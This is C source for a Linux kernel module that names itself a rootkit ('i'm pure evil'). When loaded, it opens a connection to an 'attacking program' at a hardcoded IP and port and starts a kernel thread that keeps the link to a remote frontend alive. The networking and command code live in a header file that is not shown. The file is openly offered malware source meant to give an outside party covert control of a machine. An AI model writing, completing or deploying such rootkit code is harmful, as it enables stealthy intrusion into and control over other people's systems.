#include <linux/kthread.h>
#include <linux/module.h>

#include "network.h"

static char *ip = "192.168.122.34";
static int port = 9996;
static struct task_struct *thread = NULL;

module_param(ip, charp, 0660);
module_param(port, int, 0660);
MODULE_PARM_DESC(ip, "IP address of the attacking program");
MODULE_PARM_DESC(port, "Port number of the attacking program");

static __init int rootkit_init(void)
{
    pr_info("rootkit: Hello World!\n");
    if ((network_init("192.168.122.34", 9996)) != 0)
    {
        pr_warning("rootkit: could not initialize connection. exiting.");
        return 0;
    }

    // Network setup succeeded. Start thread to keep connection with frontend:
    thread = kthread_run(network_loop, NULL, "loop_thread");
    if (IS_ERR(thread))
    {
        pr_err("rootkit: thread failed to start\n");
        /* thread = NULL; */
        return PTR_ERR(thread);
    }

    // TODO: if thread exits because connection lost, start over.
    pr_info("rootkit: started network loop thread.\n");
    return 0;
}

static __exit void rootkit_exit(void)
{
    if (thread)
    {
        // TODO: find some way to stop thread even if it's stopped at a recv.
        kthread_stop(thread);
    }
    network_exit();
    pr_info("rootkit: Goodbye.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("i'm pure evil");
MODULE_AUTHOR("Naim Chefirat");
